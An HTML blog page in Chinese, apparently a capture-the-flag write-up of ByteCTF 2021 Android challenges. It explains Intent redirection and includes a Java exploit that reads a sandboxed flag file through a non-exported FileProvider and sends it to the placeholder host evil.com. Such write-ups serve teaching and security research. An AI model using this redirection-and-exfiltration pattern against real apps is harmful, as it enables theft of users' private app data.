@@ -1,0 +1,1642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Bytectf2021初赛 - EP`s blog</title><meta name="Description" content="关于 LoveIt 主题"><meta property="og:title" content="Bytectf2021初赛" />
+<meta property="og:description" content="有几道Android pwn感觉挺有意思的" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://linkleyping.top/bytectf2021-pre/" />
+<meta property="og:image" content="https://linkleyping.top/logo.png"/>
+<meta property="article:published_time" content="2021-10-17T19:52:20+08:00" />
+<meta property="article:modified_time" content="2022-04-02T20:47:48+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://linkleyping.top/logo.png"/>
+
+<meta name="twitter:title" content="Bytectf2021初赛"/>
+<meta name="twitter:description" content="有几道Android pwn感觉挺有意思的"/>
+<meta name="application-name" content="EP`s blog">
+<meta name="apple-mobile-web-app-title" content="EP`s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://linkleyping.top/bytectf2021-pre/" /><link rel="prev" href="https://linkleyping.top/dvwa/" /><link rel="next" href="https://linkleyping.top/url-bypass/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Bytectf2021初赛",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/linkleyping.top\/bytectf2021-pre\/"
+        },"image": ["https:\/\/linkleyping.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  5151 ,
+        "url": "https:\/\/linkleyping.top\/bytectf2021-pre\/","datePublished": "2021-10-17T19:52:20+08:00","dateModified": "2022-04-02T20:47:48+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/linkleyping.top\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "EP"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">  
+    <div class="header-wrapper">  
+        <div class="header-title">  
+            <a href="/" title="EP`s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/icon.png"
+        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
+        data-sizes="auto"
+        alt="/images/icon.png"
+        title="/images/icon.png" />EP`s blog</a>  
+        </div>  
+        <div class="menu">  
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">  
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">  
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">  
+                            <i class="fas fa-search fa-fw"></i>  
+                        </a>  
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">  
+                            <i class="fas fa-times-circle fa-fw"></i>  
+                        </a>  
+                        <span class="search-button search-loading" id="search-loading-desktop">  
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
+                        </span>  
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
+                    <i class="fas fa-adjust fa-fw"></i>  
+                </a>  
+            </div>  
+        </div>  
+    </div>  
+</header><header class="mobile" id="header-mobile">  
+    <div class="header-container">  
+        <div class="header-wrapper">  
+            <div class="header-title">  
+                <a href="/" title="EP`s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/icon.png"
+        data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x"
+        data-sizes="auto"
+        alt="/images/icon.png"
+        title="/images/icon.png" />EP`s blog</a>  
+            </div>  
+            <div class="menu-toggle" id="menu-toggle-mobile">  
+                <span></span><span></span><span></span>  
+            </div>  
+        </div>  
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">  
+                    <div class="search mobile" id="search-mobile">  
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">  
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">  
+                            <i class="fas fa-search fa-fw"></i>  
+                        </a>  
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">  
+                            <i class="fas fa-times-circle fa-fw"></i>  
+                        </a>  
+                        <span class="search-button search-loading" id="search-loading-mobile">  
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>  
+                        </span>  
+                    </div>  
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">  
+                        取消  
+                    </a>  
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/LinkleYping" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">  
+                <i class="fas fa-adjust fa-fw"></i>  
+            </a></div>  
+    </div>  
+</header>  
+<div class="search-dropdown desktop">  
+    <div id="search-dropdown-desktop"></div>  
+</div>  
+<div class="search-dropdown mobile">  
+    <div id="search-dropdown-mobile"></div>  
+</div>  
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Bytectf2021初赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://linkleyping.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>EP</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-10-17">2021-10-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5151 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intent重定向">Intent重定向</a></li>
+    <li><a href="#babydroid">babydroid</a>
+      <ul>
+        <li><a href="#apk分析">Apk分析</a></li>
+        <li><a href="#攻击过程">攻击过程</a></li>
+        <li><a href="#exp">Exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#easydroid">easydroid</a>
+      <ul>
+        <li><a href="#apk分析-1">Apk分析</a></li>
+        <li><a href="#攻击过程-1">攻击过程</a></li>
+        <li><a href="#exp-1">Exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#mediumdroid">mediumdroid</a>
+      <ul>
+        <li><a href="#apk分析-2">Apk分析</a></li>
+        <li><a href="#攻击过程-2">攻击过程</a></li>
+        <li><a href="#exp-2">Exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>有几道Android pwn感觉挺有意思的</p>
+<h2 id="intent重定向">Intent重定向</h2>
+<p>Intent是Android 常用的组件间互相通信的信息对象，常用于启动组件或传递数据</p>
+<p>
+
+
+    <div class="post-img-view">
+        <a data-fancybox="gallery" href="/images/bytectf2021-pre/1.png">
+            <img src="/images/bytectf2021-pre/1.png" alt=""  />
+        </a>
+    </div>
+</p>
+<p>Intent重定向漏洞类似web中的SSRF，可以借助可导出的应用重定向到非导出的应用</p>
+<p>通过intent重定向，可以以目标app的权限来间接访问到应用中的未导出的组件，即<strong>launch anywhere</strong>。</p>
+<p>常见的利用场景</p>
+<ul>
+<li>系统settings可以绕过密码认证的界面打开重置手机pin码的activity</li>
+<li>打开未导出的webview组件进一步转化为webview的漏洞</li>
+<li>打开外部app，这个过程中可以进行一次临时的授权，给予外部app对文件的读写权限。</li>
+</ul>
+<p>Intent重定向的常见形式:</p>
+<p>
+
+
+    <div class="post-img-view">
+        <a data-fancybox="gallery" href="/images/bytectf2021-pre/3.png">
+            <img src="/images/bytectf2021-pre/3.png" alt=""  />
+        </a>
+    </div>
+</p>
+<h2 id="babydroid">babydroid</h2>
+<h3 id="apk分析">Apk分析</h3>
+<p>Manifest文件:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">&#34;http://schemas.android.com/apk/res/android&#34;</span> <span class="na">android:versionCode=</span><span class="s">&#34;1&#34;</span> <span class="na">android:versionName=</span><span class="s">&#34;1.0&#34;</span> <span class="na">android:compileSdkVersion=</span><span class="s">&#34;30&#34;</span> <span class="na">android:compileSdkVersionCodename=</span><span class="s">&#34;11&#34;</span> <span class="na">package=</span><span class="s">&#34;com.bytectf.babydroid&#34;</span> <span class="na">platformBuildVersionCode=</span><span class="s">&#34;30&#34;</span> <span class="na">platformBuildVersionName=</span><span class="s">&#34;11&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;uses-sdk</span> <span class="na">android:minSdkVersion=</span><span class="s">&#34;21&#34;</span> <span class="na">android:targetSdkVersion=</span><span class="s">&#34;30&#34;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;application</span> <span class="na">android:theme=</span><span class="s">&#34;@style/Theme.Babydroid&#34;</span> <span class="na">android:label=</span><span class="s">&#34;@string/app_name&#34;</span> <span class="na">android:icon=</span><span class="s">&#34;@mipmap/ic_launcher&#34;</span> <span class="na">android:debuggable=</span><span class="s">&#34;true&#34;</span> <span class="na">android:allowBackup=</span><span class="s">&#34;true&#34;</span> <span class="na">android:supportsRtl=</span><span class="s">&#34;true&#34;</span> <span class="na">android:roundIcon=</span><span class="s">&#34;@mipmap/ic_launcher_round&#34;</span> <span class="na">android:appComponentFactory=</span><span class="s">&#34;androidx.core.app.CoreComponentFactory&#34;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;com.bytectf.babydroid.MainActivity&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span><span class="nt">/&gt;</span>
+                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+        <span class="nt">&lt;/activity&gt;</span>
+        <span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;com.bytectf.babydroid.Vulnerable&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;com.bytectf.TEST&#34;</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+        <span class="nt">&lt;/activity&gt;</span>
+        <span class="nt">&lt;receiver</span> <span class="na">android:name=</span><span class="s">&#34;com.bytectf.babydroid.FlagReceiver&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;false&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;com.bytectf.SET_FLAG&#34;</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+        <span class="nt">&lt;/receiver&gt;</span>
+        <span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">&#34;androidx.core.content.FileProvider&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;false&#34;</span> <span class="na">android:authorities=</span><span class="s">&#34;androidx.core.content.FileProvider&#34;</span> <span class="na">android:grantUriPermissions=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">&#34;android.support.FILE_PROVIDER_PATHS&#34;</span> <span class="na">android:resource=</span><span class="s">&#34;@xml/file_paths&#34;</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/provider&gt;</span>
+    <span class="nt">&lt;/application&gt;</span>
+<span class="nt">&lt;/manifest&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>当Activity中存在intent-filter时默认时可导出的，所以外部应用可以直接打开<code>Vulnerable</code>，其内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Vulnerable</span> <span class="kd">extends</span> <span class="n">Activity</span> <span class="o">{</span>
+    <span class="cm">/* access modifiers changed from: protected */</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">startActivity</span><span class="o">((</span><span class="n">Intent</span><span class="o">)</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">&#34;intent&#34;</span><span class="o">));</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>利用这个方法可以使用传入的intent参数直接<code>startactivity</code>且没有任何校验，这样就可以以目标app的身份进行一次<code>startactivity</code>完成intent的重定向。</p>
+<p>app中存在一个非导出的<code>FileProvider</code>，可以提供文件的读写和分享能力。其执行的file_paths内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span class="nt">&lt;paths&gt;</span>
+    <span class="nt">&lt;root-path</span> <span class="na">name=</span><span class="s">&#34;root&#34;</span> <span class="na">path=</span><span class="s">&#34;&#34;</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/paths&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其导出的文件可以从root即根路径开始，都可以用这个FileProvider访问到(前提时目标app有权限访问，可以访问目标app沙箱内部的文件，以此完成沙箱内的文件读写，甚至可以读写内部的可执行文件，dex or so)</p>
+<p>所以可以使用<strong>intent重定向</strong>来访问这个非导出的FileProvider内容，使用目标app的权限来读取其沙箱内部的文件。flag文件是通过接收广播后写入到沙箱内部files文件夹中的。</p>
+<p>一般app中除了FileProvider还有其他可利用的内容，比如说联系人等。</p>
+<h3 id="攻击过程">攻击过程</h3>
+<p>
+
+
+    <div class="post-img-view">
+        <a data-fancybox="gallery" href="/images/bytectf2021-pre/2.png">
+            <img src="/images/bytectf2021-pre/2.png" alt=""  />
+        </a>
+    </div>
+</p>
+<h3 id="exp">Exp</h3>
+<p>MainActivity:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">getIntent</span><span class="o">().</span><span class="na">getAction</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">)){</span>
+            <span class="n">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">();</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">inputStream</span><span class="o">.</span><span class="na">available</span><span class="o">()];</span>
+                <span class="n">inputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+                <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">,</span> <span class="n">str</span><span class="o">);</span>
+                <span class="n">httprequest</span><span class="o">(</span><span class="s">&#34;http://evil.com/?&#34;</span> <span class="o">+</span> <span class="n">str</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">FileNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+            <span class="n">Intent</span> <span class="n">extra</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">);</span>
+            <span class="n">extra</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="n">MainActivity</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+         <span class="n">extra</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&#34;</span><span class="o">));</span>
+            <span class="n">extra</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span>
+                    <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_PREFIX_URI_PERMISSION</span>
+                    <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span>
+                    <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>
+
+            <span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;com.bytectf.babydroid&#34;</span><span class="o">,</span> <span class="s">&#34;com.bytectf.babydroid.Vulnerable&#34;</span><span class="o">);</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">&#34;com.bytectf.TEST&#34;</span><span class="o">);</span>
+            <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;intent&#34;</span><span class="o">,</span> <span class="n">extra</span><span class="o">);</span>
+            <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="easydroid">easydroid</h2>
+<h3 id="apk分析-1">Apk分析</h3>
+<p>题目中可导出的<code>MainActivity</code>内容:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">AppCompatActivity</span> <span class="o">{</span>
+    <span class="cm">/* access modifiers changed from: protected */</span>
+    <span class="nd">@Override</span> <span class="c1">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;http://app.toutiao.com/&#34;</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getAuthority</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;toutiao.com&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="o">.</span><span class="na">getScheme</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">WebView</span> <span class="n">webView</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WebView</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">());</span>
+            <span class="n">webView</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="n">WebViewClient</span><span class="o">()</span> <span class="o">{</span>
+                <span class="cm">/* class com.bytectf.easydroid.MainActivity.AnonymousClass1 */</span>
+
+                <span class="nd">@Override</span> <span class="c1">// android.webkit.WebViewClient
+</span><span class="c1"></span>                <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">shouldOverrideUrlLoading</span><span class="o">(</span><span class="n">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">if</span> <span class="o">(!</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">url</span><span class="o">).</span><span class="na">getScheme</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;intent&#34;</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">shouldOverrideUrlLoading</span><span class="o">(</span><span class="n">view</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+                    <span class="o">}</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">MainActivity</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">parseUri</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">1</span><span class="o">));</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">URISyntaxException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+                    <span class="o">}</span>
+                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">});</span>
+            <span class="n">setContentView</span><span class="o">(</span><span class="n">webView</span><span class="o">);</span>
+            <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
